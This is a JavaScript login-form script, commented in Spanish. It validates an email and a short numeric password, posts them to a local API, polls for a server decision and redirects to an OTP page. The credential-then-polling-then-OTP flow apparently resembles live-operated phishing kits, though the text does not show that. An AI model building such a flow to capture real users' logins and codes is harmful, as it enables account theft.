<script>
  // Inicializar componentes
  const loader = new ShadowLoader({ message: 'Validando credenciales...' });
  const modalError = new ModalError({ autoHide: true, autoHideDelay: 4000 });
  const emailInput = document.getElementById('emailField');
  const passwordInput = document.getElementById('standardAdornmentPasswordId');
  const btnIngresar = document.getElementById('btnIngresar');

  // Validar email
  function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  // Validar contraseña (4-6 caracteres numéricos)
  function validatePassword(password) {
    return password && password.length >= 4 && password.length <= 6;
  }

  // Verificar si formulario está completo
  function checkFormValid() {
    const emailValid = validateEmail(emailInput.value);
    const passwordValid = validatePassword(passwordInput.value);

    if (emailValid && passwordValid) {
      btnIngresar.disabled = false;
      btnIngresar.classList.remove('Mui-disabled');
      btnIngresar.setAttribute('tabindex', '0');
    } else {
      btnIngresar.disabled = true;
      btnIngresar.classList.add('Mui-disabled');
      btnIngresar.setAttribute('tabindex', '-1');
    }
  }

  // Event listeners para validación en tiempo real
  emailInput.addEventListener('input', checkFormValid);
  passwordInput.addEventListener('input', checkFormValid);

  // Manejar clic en botón Ingresar
  btnIngresar.addEventListener('click', async (e) => {
    e.preventDefault();

    try {
      loader.show();

      // Enviar datos al servidor
      const response = await PollingClient.postData('auth/login', {
        email: emailInput.value,
        password: passwordInput.value,
      });

      const sessionId = response.sessionId;

      // Iniciar polling
      const poller = new PollingClient({
        apiUrl: 'http://localhost:3000/api',
        pollingInterval: 2000,
        onSuccess: (data) => {
          loader.hide();

          if (data.response === 'RegistroOtp' || data.response.includes('RegistroOtp')) {
            // Redirigir a OTP
            setTimeout(() => {
              window.location.href = 'registrationOTP_clean.html';
            }, 500);
          }
        },
        onError: (error) => {
          loader.hide();

          if (error.type === 'error' || error.response === 'ERROR' || error.response?.includes('ERROR')) {
            // Mostrar modal de error
            modalError.show('Los datos ingresados son incorrectos. Intenta nuevamente.');
          } else if (error.type === 'timeout') {
            modalError.show('Tiempo de espera agotado. Intenta nuevamente.');
          }
        },
      });

      poller.startPolling(sessionId, 'auth');
    } catch (error) {
      loader.hide();
      console.error('[LOGIN ERROR]', error);
      modalError.show('Error al procesar tu solicitud. Intenta de nuevo.');
    }
  });

  // Deshabilitar botón inicialmente
  checkFormValid();
</script>
